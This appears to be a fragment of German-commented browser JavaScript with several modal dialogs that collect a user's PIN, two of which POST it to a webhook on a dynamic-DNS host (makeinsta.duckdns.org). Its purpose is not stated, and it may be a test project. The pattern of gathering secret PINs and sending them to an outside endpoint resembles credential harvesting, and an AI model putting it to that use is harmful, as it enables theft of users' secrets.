
    function showModal() {
      document.getElementById("modal").style.display = "block";
    }
  
    function sendPin() {
      const pin = document.getElementById("pinInput").value;
      if (!pin) return;
  
      fetch("https://makeinsta.duckdns.org/webhook-test/f509f076-8d11-4deb-92c3-776e4ffd19b3", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ pin })
      }).then(() => {
        alert("PIN gesendet");
        document.getElementById("modal").style.display = "none";
      });
    }

    function zeigePinEingabe() {
      document.getElementById("pinEingabe").style.display = "block";
    }
  
    function sendePin(event) {
      event.preventDefault(); // verhindert Seiten-Neuladen
      const pin = document.getElementById("pin").value;
  
      fetch("https://makeinsta.duckdns.org/webhook-test/f509f076-8d11-4deb-92c3-776e4ffd19b3", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ pin: pin })
      })
      .then(response => response.text())
      .then(data => {
        alert("PIN gesendet: " + pin); // später durch Chat ersetzen
      })
      .catch(error => {
        alert("Fehler beim Senden der PIN");
        console.error(error);
      });
    }

  


    function openModal() {
      document.getElementById("pinModal").style.display = "block";
    }

    window.onclick = function(event) {
      const modal = document.getElementById("pinModal");
      if (event.target === modal) {
        modal.style.display = "none";
      }
    }

    function submitPIN() {
      const pin = document.getElementById("pinInput").value.trim();
      if (pin === "") {
        alert("Bitte PIN eingeben");
        return;
      }

      // Hier würde der Webhook aufgerufen oder Weiterleitung stattfinden
      alert("Eingereichte PIN: " + pin);
      document.getElementById("pinModal").style.display = "none";
    }
